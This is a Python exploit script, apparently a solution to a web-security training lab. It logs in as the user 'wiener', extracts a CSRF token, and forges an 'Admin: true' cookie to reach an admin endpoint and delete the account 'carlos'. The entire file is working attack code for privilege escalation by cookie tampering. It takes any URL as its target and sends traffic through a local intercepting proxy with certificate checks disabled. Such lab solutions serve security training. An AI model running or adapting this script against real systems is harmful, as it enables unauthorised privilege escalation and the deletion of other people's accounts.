import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_csrf_token(s, url):
    r = s.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(r.text, "lxml")
    csrf = soup.find("input", {"name": "csrf"})["value"]
    return csrf

def delete_user(s, url):

    # get CSRF token from the login page
    login_url = url + "/login"
    csrf_token = get_csrf_token(s, login_url)

    #login as the user 'wiener'
    data = {
        "csrf": csrf_token,
        "username": "wiener",
        "password": "peter"
    }
    r = s.post(login_url, data=data, proxies=proxies, verify=False)
    res = r.text
    if "Log out" in res:
        print("(+) Login successful.")

        # Retrieve session cookie
        session_cookie = s.cookies.get_dict().get("session")

        # visit the admin panel and delete user 'carlos'
        delete_carlos_user_url = url + "/admin/delete?username=carlos"
        cookies = {"session": session_cookie, "Admin": "true"}
        r = requests.get(delete_carlos_user_url, cookies=cookies, proxies=proxies, verify=False)
        if r.status_code == 200:
            print("(+) User 'carlos' deleted successfully.")
        else:
            print("(-) Failed to delete user 'carlos'. Status code: %d" % r.status_code)
            print("(-) Exiting the script.")
            sys.exit(-1)
    else:
        print("(-) Login failed. Exiting the script.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <URL>" % sys.argv[0])
        print("(+) Example: %s https://example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    delete_user(s, url)

if __name__ == "__main__":
    main()
